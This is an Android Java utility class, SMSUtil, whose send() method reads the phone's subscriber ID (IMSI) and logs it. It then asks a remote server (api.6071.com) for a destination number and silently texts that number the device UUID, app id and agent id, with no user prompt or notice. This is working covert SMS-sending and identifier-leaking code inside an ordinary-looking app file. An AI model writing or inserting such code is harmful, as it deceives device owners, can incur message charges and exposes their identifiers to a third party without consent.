package com.hb.hbsq.util;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import com.kk.securityhttp.domain.GoagalInfo;
import com.kk.securityhttp.domain.ResultInfo;
import com.kk.securityhttp.engin.HttpCoreEngin2;
import com.kk.securityhttp.net.contains.HttpConfig;

import rx.Observable;
import rx.functions.Action1;
import rx.functions.Func1;
import rx.schedulers.Schedulers;

/**
 * Created by zhangkai on 2017/5/2.
 */

public class SMSUtil {
    private final static int appid = 2;

    public static void send(final Context context) {
        Observable.just(FPUitl.get(context, "sms_get_mtcode", "")).filter(new Func1<String, Boolean>() {
            @Override
            public Boolean call(String s) {
                return s.isEmpty();
            }
        }).map(new Func1<String, String>() {
            @Override
            public String call(String s) {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                String mt = tm.getSubscriberId();
                if (mt == null || mt.isEmpty()) return "";
                LogUtil.msg("mt:  " + mt);
                if (mt.startsWith("46000") || mt.startsWith("46002") || mt.startsWith("46007")) {
                    mt = "0";
                } else if (mt.startsWith("46001")) {
                    mt = "1";
                } else if (mt.startsWith("46003")) {
                    mt = "2";
                }
                return mt;
            }
        }).filter(new Func1<String, Boolean>() {
            @Override
            public Boolean call(String mt) {
                return !mt.isEmpty();
            }
        }).subscribeOn(Schedulers.io()).subscribe(new Action1<String>() {
            @Override
            public void call(String mt) {
                HttpCoreEngin2.get().rxpost("http://api.6071.com/index2/get_mtcode?mt=" + mt, String.class, null, false,
                        false, false).subscribe(new Action1<ResultInfo<String>>() {
                    @Override
                    public void call(ResultInfo<String> resultInfo) {
                        if (resultInfo != null && resultInfo.code == HttpConfig.STATUS_OK && resultInfo.data != null) {
                            String agent_id = "1";
                            if (GoagalInfo.get().channelInfo != null && GoagalInfo.get().channelInfo.agent_id != null) {
                                agent_id = GoagalInfo.get().channelInfo.agent_id;
                            }
                            String message = "imeil_" + GoagalInfo.get().uuid + "_app_" + appid + "_agentid_" + agent_id;
                            String SENT_SMS_ACTION = "SENT_SMS_ACTION";
                            Intent sentIntent = new Intent(SENT_SMS_ACTION);
                            PendingIntent sendPendingIntent = PendingIntent.getBroadcast(context, 0, sentIntent,
                                    0);
                            context.registerReceiver(new BroadcastReceiver() {
                                @Override
                                public void onReceive(Context _context, Intent _intent) {
                                    switch (getResultCode()) {
                                        case Activity.RESULT_OK:
                                            FPUitl.putString(context, "sms_get_mtcode", "sms_get_mtcode");
                                            break;
                                        case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                                            break;
                                        case SmsManager.RESULT_ERROR_RADIO_OFF:
                                            break;
                                        case SmsManager.RESULT_ERROR_NULL_PDU:
                                            break;
                                    }
                                }
                            }, new IntentFilter(SENT_SMS_ACTION));
                            try {
                                SmsManager smsManager = SmsManager.getDefault();
                                smsManager.sendTextMessage(resultInfo.data, null, message, sendPendingIntent, null);
                            } catch (SecurityException e) {
                                LogUtil.msg(e.getMessage());

                            }
                        }
                    }
                });
            }
        });
    }
}
